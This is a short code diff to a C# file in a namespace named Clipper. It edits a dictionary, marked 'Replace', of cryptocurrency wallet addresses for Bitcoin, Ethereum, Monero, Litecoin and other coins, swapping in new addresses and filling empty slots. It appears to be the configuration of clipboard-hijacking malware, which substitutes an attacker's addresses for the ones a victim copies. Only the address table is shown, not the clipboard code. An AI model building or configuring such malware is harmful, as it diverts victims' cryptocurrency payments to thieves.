@@ -16,12 +16,12 @@ namespace Clipper
         // Replace 
         public static Dictionary<string, string> addresses = new Dictionary<string, string>()
         {
-            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" }, // Bitcoin
-            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" }, // Ethereum
-            {"xmr", "" }, // Monero
+            {"btc", "bc1qptlaq3jx4ysfxwhp09rc22yyh8ncm6eew7c4qq" }, // Bitcoin
+            {"eth", "0xf8B9e54C66a8Ac253F375cC05cE7aB0ddA516dc1" }, // Ethereum
+            {"xmr", "41nizz95at5QEZ9ZhLi2mUHVHEHhbDSXB4Q3uMNFh5H8H7w9TtRzZ3qQkkMdkf7B3v7TVMCZ63gmqgaSkWtgjnv5L9Ke7cR" }, // Monero
             {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
             {"xrp", "" }, // Ripple
-            {"ltc", "" }, // Litecoin
+            {"ltc", "ltc1qxpsuma67n4hvznwvdj3l7w98t2kygvy92e0ayw" }, // Litecoin
             {"nec", "" }, // Neocoin
             {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
             {"dash", "" } // Dashcoin
